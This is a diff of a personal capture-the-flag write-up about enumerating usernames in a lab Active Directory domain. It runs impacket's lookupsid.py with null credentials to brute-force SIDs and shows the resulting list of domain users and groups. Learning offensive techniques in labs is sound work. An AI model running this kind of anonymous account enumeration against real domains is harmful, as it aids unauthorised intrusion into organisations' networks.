@@ -89,3 +89,29 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 
 reset the room again again. Without a website with a list of emails or an open SMB share with a user list or LDAP bindings permitting users or comments to be enumerated. Walkthroughs go one of two ways here. Just guessing UNs with tools like kerbrute and spamming wordlists of guesses. Using a python script to assemble username guesses with common names and symbol combinations looking for SID matches. One walkthrough  I read used a tool called lookupsid.py and this can be used as a SID brute forcing tool all in one pre made script. Just like our nxc command that grabbed we can use null UN/PW arguments
 
+root@ip-10-201-48-39:/opt/impacket/examples# python3 lookupsid.py ' ':''@10.201.9.75 >> SIDBrute.txt
+Password:
+root@ip-10-201-48-39:/opt/impacket/examples# head -n 20 SIDBrute.txt 
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Brute forcing SIDs at 10.201.9.75
+[*] StringBinding ncacn_np:10.201.9.75[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
+498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: SOUPEDECODE\Administrator (SidTypeUser)
+501: SOUPEDECODE\Guest (SidTypeUser)
+502: SOUPEDECODE\krbtgt (SidTypeUser)
+512: SOUPEDECODE\Domain Admins (SidTypeGroup)
+513: SOUPEDECODE\Domain Users (SidTypeGroup)
+514: SOUPEDECODE\Domain Guests (SidTypeGroup)
+515: SOUPEDECODE\Domain Computers (SidTypeGroup)
+516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
+517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
+518: SOUPEDECODE\Schema Admins (SidTypeGroup)
+519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
+520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
+521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
+522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
+root@ip-10-201-48-39:/opt/impacket/examples# 
+
+AFTER RESETTING AGAIN I got the lookupsid.py to land
